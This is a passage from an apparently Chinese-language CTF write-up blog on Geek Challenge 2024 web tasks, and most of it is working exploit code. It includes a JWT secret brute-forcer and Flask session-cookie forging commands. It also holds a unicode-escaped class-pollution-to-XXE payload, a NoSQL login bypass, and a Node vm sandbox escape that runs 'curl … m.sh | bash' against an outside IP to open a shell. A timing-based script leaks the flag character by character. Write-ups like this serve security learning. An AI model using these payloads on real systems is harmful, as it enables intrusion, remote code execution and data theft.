class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(</span><br><span class="line">                token, verify=<span class="literal">True</span>, key=line, algorithms=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">            )  <span class="comment"># 设置编码方式为 HS256  ！这里自行更改</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> (</span><br><span class="line">            jwt.exceptions.ExpiredSignatureError,</span><br><span class="line">            jwt.exceptions.InvalidAudienceError,</span><br><span class="line">            jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">            jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">            jwt.exceptions.ImmatureSignatureError,</span><br><span class="line">        ):  <span class="comment"># 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:  <span class="comment"># 签名错误则表示密钥不正确</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>flask-unsign使用

decode
flask-unsign --decode --cookie &#39;eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8&#39;
flask-unsign --decode --cookie &#39;eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8&#39; --secret &#39;CHANGEME&#39;

爆破密钥
flask-unsign --unsign --cookie &#39;eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiMSJ9.Z0QnHQ.r92N4qr203gikX6xYAsl3DCtowM&#39;

encode
flask-unsign --sign --cookie &quot;&#123;&#39;logged_in&#39;: True&#125;&quot; --secret &#39;CHANGEME&#39;
</code></pre><p>使用flask-unsign</p><pre><code>flask-unsign --unsign --cookie &#39;eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiMSJ9.Z0QnHQ.r92N4qr203gikX6xYAsl3DCtowM&#39;
</code></pre><p>跑出密钥值为a123456。伪造cookie为admin</p><pre><code>flask-unsign --sign --cookie &quot;&#123;&#39;_flashes&#39;: [(&#39;success&#39;, &#39;登录成功&#39;)], &#39;username&#39;: &#39;admin&#39;&#125;&quot; --secret &#39;a123456&#39;
</code></pre><p>admin页面有源码下载，反编译为 app.py</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;xml_data&#x27;</span>] = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">admin = User(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456j1rrynonono&#x27;</span>)</span><br><span class="line">Users = [</span><br><span class="line">    admin]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.username == username:</span><br><span class="line">                flash(<span class="string">&#x27;用户名已存在&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        new_user = User(username, password)</span><br><span class="line">        Users.append(new_user)</span><br><span class="line">        flash(<span class="string">&#x27;注册成功！请登录&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">register = app.route(<span class="string">&#x27;/register&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.check(&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: password &#125;):</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                flash(<span class="string">&#x27;登录成功&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;用户名或密码错误&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login = app.route(<span class="string">&#x27;/login&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(login)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/templates/play.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, **(<span class="string">&#x27;encoding&#x27;</span>,)) <span class="keyword">as</span> file:</span><br><span class="line">            play_html = file.read()</span><br><span class="line">        <span class="keyword">return</span> play_html</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">play = app.route(<span class="string">&#x27;/play&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(play)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], **(<span class="string">&#x27;username&#x27;</span>,))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">admin = app.route(<span class="string">&#x27;/admin&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloads321</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./source/app.pyc&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;as_attachment&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">downloads321 = app.route(<span class="string">&#x27;/downloads321&#x27;</span>)(downloads321)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        is_admin = session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> is_admin:</span><br><span class="line">            user_tag = <span class="string">&#x27;Admin User&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_tag = <span class="string">&#x27;Normal User&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], user_tag, is_admin, **(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;is_admin&#x27;</span>))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">dashboard = app.route(<span class="string">&#x27;/dashboard&#x27;</span>)(dashboard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xml_parse</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_bytes = app.config[<span class="string">&#x27;xml_data&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        parser = etree.XMLParser(<span class="literal">True</span>, <span class="literal">True</span>, **(<span class="string">&#x27;load_dtd&#x27;</span>, <span class="string">&#x27;resolve_entities&#x27;</span>))</span><br><span class="line">        tree = etree.fromstring(xml_bytes, parser, **(<span class="string">&#x27;parser&#x27;</span>,))</span><br><span class="line">        result_xml = etree.tostring(tree, <span class="literal">True</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;pretty_print&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;xml_declaration&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> Response(result_xml, <span class="string">&#x27;application/xml&#x27;</span>, **(<span class="string">&#x27;mimetype&#x27;</span>,))</span><br><span class="line">        <span class="keyword">except</span> etree.XMLSyntaxError:</span><br><span class="line">            e = <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xml_parse = app.route(<span class="string">&#x27;/xml_parse&#x27;</span>)(xml_parse)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__class__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__init__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__globals__&#x27;</span>.encode()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_route</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&#x27;NONONO, Bad Hacker&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">                data = <span class="literal">None</span>.loads(request.data.decode())</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(data.values())):</span><br><span class="line">                    update(data, User)</span><br><span class="line">                    <span class="keyword">return</span> (jsonify(&#123;</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;更新成功&#x27;</span> &#125;), <span class="number">200</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">f&#x27;&#x27;&#x27;Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">                    e = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">del</span> e</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&#x27;No data provided&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update_route = app.route(<span class="string">&#x27;/update&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(update_route)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, <span class="literal">False</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>))</span><br></pre></td></tr></table></figure><p>存在xml_parse路由，和update函数。很明显我们要打原型链污染xml_data从而进行xxe。<br>黑名单采用unicode编码绕过<br>POC:</p><pre><code>&#123;
    &quot;__init__&quot;:&#123;
        &quot;__globals__&quot;:&#123;
            &quot;app&quot;:&#123;
                &quot;config&quot;:&#123;
                    &quot;xml_data&quot;:&quot;
                        &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
                        &lt;!DOCTYPE xxe [
                        &lt;!ELEMENT name ANY &gt;
                        &lt;!ENTITY admin SYSTEM &quot;/flag&quot; &gt;]&gt;
                        &lt;user&gt;
                        &lt;username&gt;&amp;admin;&lt;/username&gt;
                        &lt;password&gt;123456&lt;/password&gt;
                        &lt;/user&gt;
                        &quot;
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre><p>用cyberchef的unicode escape编码<br>payload:</p><pre><code>&#123;
    &quot;_\u005Finit__&quot;:&#123;
        &quot;_\u005Fglobals__&quot;:&#123;
            &quot;app&quot;:&#123;
                &quot;config&quot;:&#123;
                    &quot;xml_data&quot;:&quot;\u003C\u003F\u0078\u006D\u006C\u0020\u0076\u0065\u0072\u0073\u0069\u006F\u006E\u003D\u0022\u0031\u002E\u0030\u0022\u0020\u0065\u006E\u0063\u006F\u0064\u0069\u006E\u0067\u003D\u0022\u0075\u0074\u0066\u002D\u0038\u0022\u003F\u003E\u000A\u003C\u0021\u0044\u004F\u0043\u0054\u0059\u0050\u0045\u0020\u0078\u0078\u0065\u0020\u005B\u000A\u003C\u0021\u0045\u004C\u0045\u004D\u0045\u004E\u0054\u0020\u006E\u0061\u006D\u0065\u0020\u0041\u004E\u0059\u0020\u003E\u000A\u003C\u0021\u0045\u004E\u0054\u0049\u0054\u0059\u0020\u0061\u0064\u006D\u0069\u006E\u0020\u0053\u0059\u0053\u0054\u0045\u004D\u0020\u0022\u002F\u0066\u006C\u0061\u0067\u0022\u0020\u003E\u005D\u003E\u000A\u003C\u0075\u0073\u0065\u0072\u003E\u000A\u003C\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003E\u0026\u0061\u0064\u006D\u0069\u006E\u003B\u003C\u002F\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003E\u000A\u003C\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003E\u0031\u0032\u0033\u0034\u0035\u0036\u003C\u002F\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003E\u000A\u003C\u002F\u0075\u0073\u0065\u0072\u003E&quot;
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre><p>在update路由传参，并在xml_parse收到flag</p><h2 id="noSandbox（复现）"><a href="#noSandbox（复现）" class="headerlink" title="noSandbox（复现）"></a>noSandbox（复现）</h2><p>SQL采用了MongoDB<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/9908">https://xz.aliyun.com/t/9908</a><br>用Nosql的永真式注入绕过登录</p><pre><code>&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;
</code></pre><p>接下来给了execute路由执行js代码<br>考点是VM逃逸<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a><br>分析获得的app_part.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//泄露的代码执行和WAF部分代码,不能直接运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(find|ownKeys|fromCharCode|includes|\&#x27;|\&quot;|replace|fork|reverse|fs|process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function|env)/m</span>;</span><br><span class="line">    <span class="keyword">if</span> (code.<span class="title function_">match</span>(pattern)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WAF detected malicious code&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;WAF detected malicious code&#x27;</span>);</span><br><span class="line">        <span class="title function_">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/execute&#x27;</span>, upload.<span class="title function_">none</span>(), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing execution code credentials.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid token provided.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Received code for execution: <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">waf</span>(code,res);</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Executing code in sandbox context&#x27;</span>);</span><br><span class="line">        script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Code executed successfully. Result: <span class="subst">$&#123;sandbox.result || <span class="string">&#x27;No result returned.&#x27;</span>&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">json</span>(<span class="string">&#x27;Code executed successfully&#x27;</span> );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error executing code: <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">`Error: there&#x27;s no display back here,may be it executed successfully?`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用`${}`绕过黑名单，利用官方题解总结</p><pre><code>process `$&#123;`$&#123;`proce`&#125;ss`&#125;`
prototype `$&#123;`$&#123;`prototyp`&#125;e`&#125;`
get_process `$&#123;`$&#123;`get_pro`&#125;cess`&#125;`
require `$&#123;`$&#123;`requir`&#125;e`&#125;`
execSync `$&#123;`$&#123;`exe`&#125;cSync`&#125;`
return process `$&#123;`$&#123;`return proc`&#125;ess`&#125;`
constructor `$&#123;`$&#123;`constructo`&#125;r`&#125;`
child_process `$&#123;`$&#123;`child_proces`&#125;s`&#125;`
</code></pre><p>payload:</p><pre><code>throw new Proxy(&#123;&#125;, &#123;get: function()&#123;const cc = arguments.callee.caller;const p = (cc.constructor.constructor(`$&#123;`$&#123;`return proc`&#125;ess`&#125;`))();chi=p.mainModule.require(`$&#123;`$&#123;`child_proces`&#125;s`&#125;`);res=Reflect.get(chi,`$&#123;`$&#123;`exe`&#125;cSync`&#125;`)(`curl 8.155.17.250/m.sh | bash`);return res.toString();&#125;&#125;)
</code></pre><p>直接反弹shell即可</p><h2 id="escapeSandbox-PLUS（复现）"><a href="#escapeSandbox-PLUS（复现）" class="headerlink" title="escapeSandbox_PLUS（复现）"></a>escapeSandbox_PLUS（复现）</h2><p>这个是真弄不懂原理，先把payload放上来<br>Part1：</p><pre><code>username:ſyclover
password:J1rrY
</code></pre><p>Part2：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ses = requests.session()</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;connect.sid=s%3AfkMOAgnXVe1bL5LoJ2KnKe3sjwHIPlP4.m1w4YDm7xwFa5aytoMLXKOp%2BV30kp4JQCD7Ylz4ww0g&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://3000-fead7ddc-eb05-474f-9c78-ec5636d0eb66.challenge.ctfplus.cn/execute&quot;</span></span><br><span class="line">pos = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    strs = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;-&#125;_&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strs:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;code[]&quot;</span>: <span class="string">&quot;async function fn() &#123; (function stack() &#123; new Error().stack; stack(); &#125;)(); &#125; p = fn(); p.constructor = &#123; [Symbol.species]: class FakePromise &#123; constructor(executor) &#123; executor((x) =&gt; x, (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;sleep $(cat /flag| cut -c%s | tr %s 2)&#x27;); &#125;) &#125; &#125; &#125;; p.then();&quot;</span></span><br><span class="line">            % (<span class="built_in">str</span>(pos), i)</span><br><span class="line">        &#125;</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        req1 = ses.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="built_in">print</span>(req1.text)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="built_in">print</span>(i + <span class="built_in">str</span>(t2 - t1))</span><br><span class="line">        <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="ez-js（复现）"><a href="#ez-js（复现）" 